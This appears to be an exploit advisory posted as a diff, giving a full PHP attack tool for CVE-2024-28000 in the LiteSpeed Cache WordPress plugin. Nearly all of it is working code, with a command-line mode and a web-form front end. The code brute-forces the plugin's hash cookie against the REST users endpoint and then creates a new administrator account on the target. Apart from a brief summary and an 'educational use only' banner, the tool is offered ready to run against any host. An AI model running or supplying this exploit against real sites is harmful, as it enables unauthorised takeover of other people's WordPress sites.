@@ -1,0 +1,561 @@
+=============================================================================================================================================
+| # Title     : Litespeed Cache 6.4.0.1 Insufficient Hash Validation                                                                        |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.litespeedtech.com/products/cache-plugins                                                                        |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/200819/ & 		CVE-2024-28000
+
+[+] Summary : 
+             Critical unauthenticated privilege escalation vulnerability in LiteSpeed Cache WordPress plugin (versions 6.4.0.1) 
+			 allowing attackers to brute-force authentication hashes and create administrative users without any initial credentials.
+[+]  POC : 
+
+php poc.php  or http://127.0.0.1/poc.php 
+
+<?php
+/*
+ * LiteSpeed Cache 6.4.0.1 - Privilege Escalation
+ * by indoushka
+ */
+
+class LiteSpeedPrivEsc {
+    private $target;
+    private $port;
+    private $ssl;
+    private $base_path;
+    private $timeout;
+    private $admin_user_id;
+    private $new_username;
+    private $new_user_password;
+    
+    public function __construct($target, $port = 80, $ssl = false, $base_path = '/', $admin_user_id = '1', $new_username = 'newadmin', $new_user_password = 'AdminPass123!') {
+        $this->target = $target;
+        $this->port = $port;
+        $this->ssl = $ssl;
+        $this->base_path = rtrim($base_path, '/');
+        $this->timeout = 30;
+        $this->admin_user_id = $admin_user_id;
+        $this->new_username = $new_username;
+        $this->new_user_password = $new_user_password;
+    }
+    
+    /**
+     * Check if target is vulnerable
+     */
+    public function check() {
+        echo "[*] Checking LiteSpeed Cache vulnerability...\n";
+        
+        // Check if WordPress REST API is accessible
+        $res = $this->send_request('/wp-json/wp/v2/users');
+        if (!$res || $res['code'] != 200) {
+            echo "[-] WordPress REST API not accessible\n";
+            return "unknown";
+        }
+        
+        echo "[+] WordPress REST API detected\n";
+        
+        // Try to trigger hash generation
+        if ($this->trigger_hash_generation()) {
+            echo "[+] Hash generation endpoint accessible\n";
+            
+            // Test with a random hash
+            $test_hash = $this->generate_random_string(6);
+            $test_result = $this->test_hash($test_hash);
+            
+            if ($test_result === 'unauthorized') {
+                echo "[+] Hash validation is active\n";
+                echo "[+] Target appears to be vulnerable\n";
+                return "vulnerable";
+            } else {
+                echo "[-] Hash validation not working as expected\n";
+                return "unknown";
+            }
+        }
+        
+        echo "[-] Cannot trigger hash generation\n";
+        return "safe";
+    }
+    
+    /**
+     * Trigger hash generation via AJAX
+     */
+    private function trigger_hash_generation() {
+        $data = [
+            'action' => 'async_litespeed',
+            'litespeed_type' => 'crawler'
+        ];
+        
+        $res = $this->send_request('/wp-admin/admin-ajax.php', 'POST', [], http_build_query($data));
+        
+        return $res && $res['code'] == 200;
+    }
+    
+    /**
+     * Test a specific hash value
+     */
+    private function test_hash($hash_value) {
+        $cookies = [
+            'litespeed_hash' => $hash_value,
+            'litespeed_role' => $this->admin_user_id
+        ];
+        
+        $res = $this->send_request('/wp-json/wp/v2/users', 'POST', [], null, [], $cookies);
+        
+        if (!$res) {
+            return 'error';
+        }
+        
+        if ($res['code'] == 201) {
+            return 'success';
+        } elseif ($res['code'] == 401) {
+            return 'unauthorized';
+        } else {
+            return 'unknown';
+        }
+    }
+    
+    /**
+     * Generate random string
+     */
+    private function generate_random_string($length = 6) {
+        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        $result = '';
+        for ($i = 0; $i < $length; $i++) {
+            $result .= $chars[rand(0, strlen($chars) - 1)];
+        }
+        return $result;
+    }
+    
+    /**
+     * Create admin user with valid hash
+     */
+    private function create_admin_user($hash_value) {
+        $cookies = [
+            'litespeed_hash' => $hash_value,
+            'litespeed_role' => $this->admin_user_id
+        ];
+        
+        $user_data = [
+            'username' => $this->new_username,
+            'password' => $this->new_user_password,
+            'email' => $this->new_username . '@example.com',
+            'roles' => ['administrator']
+        ];
+        
+        $json_data = json_encode($user_data);
+        
+        $headers = [
+            'Content-Type: application/json',
+            'Content-Length: ' . strlen($json_data)
+        ];
+        
+        $res = $this->send_request('/wp-json/wp/v2/users', 'POST', [], $json_data, $headers, $cookies);
+        
+        if ($res && $res['code'] == 201) {
+            echo "[+] ✓ Admin user created successfully!\n";
+            echo "[+] Username: {$this->new_username}\n";
+            echo "[+] Password: {$this->new_user_password}\n";
+            return true;
+        } else {
+            echo "[-] Failed to create admin user\n";
+            if ($res) {
+                echo "[-] HTTP Code: {$res['code']}\n";
+                echo "[-] Response: {$res['body']}\n";
+            }
+            return false;
+        }
+    }
+    
+    /**
+     * Brute force hash values
+     */
+    public function brute_force_hashes($max_attempts = 10000, $workers = 5) {
+        echo "[*] Starting hash brute force...\n";
+        echo "[*] Attempts: $max_attempts, Workers: $workers\n";
+        
+        // Trigger hash generation first
+        $this->trigger_hash_generation();
+        
+        $found = false;
+        $attempts = 0;
+        
+        for ($i = 0; $i < $max_attempts && !$found; $i++) {
+            $hash = $this->generate_random_string(6);
+            
+            if ($i % 100 == 0) {
+                echo "[*] Attempt $i: Testing hash: $hash\n";
+            }
+            
+            $result = $this->test_hash($hash);
+            
+            if ($result === 'success') {
+                echo "[+] ✓ Valid hash found: $hash\n";
+                echo "[*] Creating admin user...\n";
+                if ($this->create_admin_user($hash)) {
+                    $found = true;
+                    return true;
+                }
+            }
+            
+            $attempts++;
+        }
+        
+        echo "[-] No valid hash found after $attempts attempts\n";
+        return false;
+    }
+    
+    /**
+     * Execute full exploit
+     */
+    public function exploit($max_attempts = 10000) {
+        echo "[*] Starting LiteSpeed Cache privilege escalation...\n";
+        
+        // Step 1: Check vulnerability
+        $status = $this->check();
+        if ($status !== "vulnerable") {
+            echo "[-] Target does not appear to be vulnerable\n";
+            return false;
+        }
+        
+        echo "[*] Target is vulnerable, proceeding with exploitation...\n";
+        
+        // Step 2: Brute force hashes
+        if ($this->brute_force_hashes($max_attempts)) {
+            echo "[+] ✓ Privilege escalation completed successfully\n";
+            return true;
+        } else {
+            echo "[-] Privilege escalation failed\n";
+            return false;
+        }
+    }
+    
+    /**
+     * Send HTTP request
+     */
+    private function send_request($path, $method = 'GET', $params = [], $data = null, $custom_headers = [], $cookies = []) {
+        $url = $this->build_url($path);
+        
+        if ($method == 'GET' && !empty($params)) {
+            $url .= '?' . http_build_query($params);
+        }
+        
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => $this->timeout,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            CURLOPT_HEADER => false,
+            CURLOPT_CUSTOMREQUEST => $method,
+            CURLOPT_FOLLOWLOCATION => false
+        ]);
+        
+        // Add POST data if provided
+        if ($method == 'POST' && $data) {
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+        }
+        
+        // Build headers
+        $headers = array_merge([
+            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        ], $custom_headers);
+        
+        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+        
+        // Add cookies if provided
+        if (!empty($cookies)) {
+            $cookie_string = '';
+            foreach ($cookies as $name => $value) {
+                $cookie_string .= "{$name}={$value}; ";
+            }
+            curl_setopt($ch, CURLOPT_COOKIE, $cookie_string);
+        }
+        
+        $response = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        if ($response !== false) {
+            return [
+                'code' => $http_code,
+                'body' => $response
+            ];
+        }
+        
+        return false;
+    }
+    
+    /**
+     * Build full URL
+     */
+    private function build_url($path) {
+        $protocol = $this->ssl ? 'https' : 'http';
+        $full_path = $this->base_path . $path;
+        return "{$protocol}://{$this->target}:{$this->port}{$full_path}";
+    }
+}
+
+// CLI Interface
+if (php_sapi_name() === 'cli') {
+    echo "
+    ╔══════════════════════════════════════════════════════════════╗
+    ║            LiteSpeed Cache Privilege Escalation             ║
+    ║                      CVE-2024-28000                         ║
+    ║                     PHP Implementation                      ║
+    ╚══════════════════════════════════════════════════════════════╝
+    
+    \n";
+    
+    $options = getopt("t:p:s:u:cU:P:a:", [
+        "target:",
+        "port:",
+        "ssl",
+        "uri:",
+        "check",
+        "username:",
+        "password:",
+        "attempts:"
+    ]);
+    
+    $target = $options['t'] ?? $options['target'] ?? null;
+    $port = $options['p'] ?? $options['port'] ?? 80;
+    $ssl = isset($options['s']) || isset($options['ssl']);
+    $base_uri = $options['u'] ?? $options['uri'] ?? '/';
+    $check_only = isset($options['c']) || isset($options['check']);
+    $username = $options['U'] ?? $options['username'] ?? 'newadmin';
+    $password = $options['P'] ?? $options['password'] ?? 'AdminPass123!';
+    $attempts = $options['a'] ?? $options['attempts'] ?? 10000;
+    
+    if (!$target) {
+        echo "Usage: php litespeed_exploit.php [options]\n";
+        echo "Options:\n";
+        echo "  -t, --target    Target host (required)\n";
+        echo "  -p, --port      Target port (default: 80)\n";
+        echo "  -s, --ssl       Use SSL (default: false)\n";
+        echo "  -u, --uri       Base URI path (default: /)\n";
+        echo "  -c, --check     Check only (don't exploit)\n";
+        echo "  -U, --username  New admin username (default: newadmin)\n";
+        echo "  -P, --password  New admin password (default: AdminPass123!)\n";
+        echo "  -a, --attempts  Brute force attempts (default: 10000)\n";
+        echo "\nExamples:\n";
+        echo "  php litespeed_exploit.php -t 192.168.1.100 -c\n";
+        echo "  php litespeed_exploit.php -t wordpress.example.com -U myadmin -P MySecurePass123 -a 50000\n";
+        exit(1);
+    }
+    
+    $exploit = new LiteSpeedPrivEsc($target, $port, $ssl, $base_uri, '1', $username, $password);
+    
+    if ($check_only) {
+        $result = $exploit->check();
+        echo "\n[*] Result: {$result}\n";
+    } else {
+        if ($exploit->exploit($attempts)) {
+            echo "[+] Exploitation completed successfully\n";
+        } else {
+            echo "[-] Exploitation failed\n";
+        }
+    }
+    
+} else {
+    // Web Interface
+    $action = $_POST['action'] ?? '';
+    
+    if ($action === 'check' || $action === 'exploit') {
+        $target = $_POST['target'] ?? '';
+        $port = $_POST['port'] ?? 80;
+        $ssl = isset($_POST['ssl']);
+        $base_uri = $_POST['uri'] ?? '/';
+        $username = $_POST['username'] ?? 'newadmin';
+        $password = $_POST['password'] ?? 'AdminPass123!';
+        $attempts = $_POST['attempts'] ?? 10000;
+        
+        if (empty($target)) {
+            echo "<div style='color: red; padding: 10px; border: 1px solid red; margin: 10px;'>Target host is required</div>";
+        } else {
+            $exploit = new LiteSpeedPrivEsc($target, $port, $ssl, $base_uri, '1', $username, $password);
+            
+            ob_start();
+            if ($action === 'check') {
+                $exploit->check();
+            } else {
+                $exploit->exploit($attempts);
+            }
+            $output = ob_get_clean();
+            
+            echo "<pre style='background: #f4f4f4; padding: 15px; border: 1px solid #ddd; border-radius: 4px;'>$output</pre>";
+        }
+        
+        echo '<a href="' . htmlspecialchars($_SERVER['PHP_SELF']) . '" style="display: inline-block; padding: 10px 20px; background: #007cba; color: white; text-decoration: none; border-radius: 4px; margin: 10px 0;">Back to Form</a>';
+        
+    } else {
+        // Display the form
+        echo '<!DOCTYPE html>
+        <html>
+        <head>
+            <title>LiteSpeed Cache Privilege Escalation - CVE-2024-28000</title>
+            <meta charset="UTF-8">
+            <style>
+                body { 
+                    font-family: Arial, sans-serif; 
+                    margin: 0; 
+                    padding: 20px; 
+                    background: #f5f5f5;
+                }
+                .container { 
+                    max-width: 800px; 
+                    margin: 0 auto; 
+                    background: white;
+                    padding: 30px;
+                    border-radius: 8px;
+                    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+                }
+                h1 { 
+                    color: #333; 
+                    border-bottom: 2px solid #007cba;
+                    padding-bottom: 10px;
+                }
+                h3 {
+                    color: #666;
+                }
+                .form-group { 
+                    margin-bottom: 20px; 
+                }
+                label { 
+                    display: block; 
+                    margin-bottom: 8px; 
+                    font-weight: bold;
+                    color: #333;
+                }
+                input[type="text"], input[type="password"], select { 
+                    width: 100%; 
+                    padding: 10px; 
+                    border: 1px solid #ddd; 
+                    border-radius: 4px; 
+                    box-sizing: border-box;
+                    font-size: 14px;
+                }
+                .checkbox-group {
+                    display: flex;
+                    align-items: center;
+                    gap: 10px;
+                }
+                button { 
+                    background: #007cba; 
+                    color: white; 
+                    padding: 12px 25px; 
+                    border: none; 
+                    border-radius: 4px; 
+                    cursor: pointer; 
+                    margin-right: 10px;
+                    font-size: 16px;
+                    transition: background 0.3s;
+                }
+                button:hover {
+                    background: #005a87;
+                }
+                .danger { 
+                    background: #dc3545; 
+                }
+                .danger:hover {
+                    background: #c82333;
+                }
+                .info { 
+                    background: #17a2b8; 
+                }
+                .info:hover {
+                    background: #138496;
+                }
+                .warning-box {
+                    background: #fff3cd;
+                    border: 1px solid #ffeaa7;
+                    color: #856404;
+                    padding: 15px;
+                    border-radius: 4px;
+                    margin: 20px 0;
+                }
+                .info-box {
+                    background: #d1ecf1;
+                    border: 1px solid #bee5eb;
+                    color: #0c5460;
+                    padding: 15px;
+                    border-radius: 4px;
+                    margin: 20px 0;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>LiteSpeed Cache Privilege Escalation</h1>
+                <h3>CVE-2024-28000 - Hash Brute Force to Admin Access</h3>
+                
+                <div class="warning-box">
+                    <strong>⚠️ Educational Use Only:</strong> This tool demonstrates a privilege escalation vulnerability in LiteSpeed Cache.
+                    Use only on systems you own or have explicit permission to test.
+                </div>
+                
+                <form method="post">
+                    <div class="form-group">
+                        <label for="target">Target Host:</label>
+                        <input type="text" id="target" name="target" placeholder="192.168.1.100 or wordpress.example.com" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="port">Port:</label>
+                        <input type="text" id="port" name="port" value="80">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="uri">Base URI:</label>
+                        <input type="text" id="uri" name="uri" value="/">
+                    </div>
+                    
+                    <div class="form-group">
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="ssl" name="ssl">
+                            <label for="ssl" style="display: inline; font-weight: normal;">Use SSL</label>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="username">New Admin Username:</label>
+                        <input type="text" id="username" name="username" value="newadmin">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password">New Admin Password:</label>
+                        <input type="password" id="password" name="password" value="AdminPass123!">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="attempts">Brute Force Attempts:</label>
+                        <input type="text" id="attempts" name="attempts" value="10000">
+                    </div>
+                    
+                    <button type="submit" name="action" value="check" class="info">Check Vulnerability</button>
+                    <button type="submit" name="action" value="exploit" class="danger">Execute Exploit</button>
+                </form>
+                
+                <div class="info-box">
+                    <h3>About CVE-2024-28000:</h3>
+                    <p><strong>Vulnerability:</strong> Insufficient hash validation leading to privilege escalation</p>
+                    <p><strong>Affected Versions:</strong> LiteSpeed Cache ≤ 6.4.0.1</p>
+                    <p><strong>Authentication:</strong> None required for initial access</p>
+                    <p><strong>Endpoint:</strong> /wp-admin/admin-ajax.php & /wp-json/wp/v2/users</p>
+                    <p><strong>Attack:</strong> Hash brute force to create admin user</p>
+                    <p><strong>Impact:</strong> Privilege escalation to WordPress administrator</p>
+                    <p><strong>Exploit Chain:</strong> Trigger Hash → Brute Force → Create Admin User</p>
+                </div>
+            </div>
+        </body>
+        </html>';
+    }
+}
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
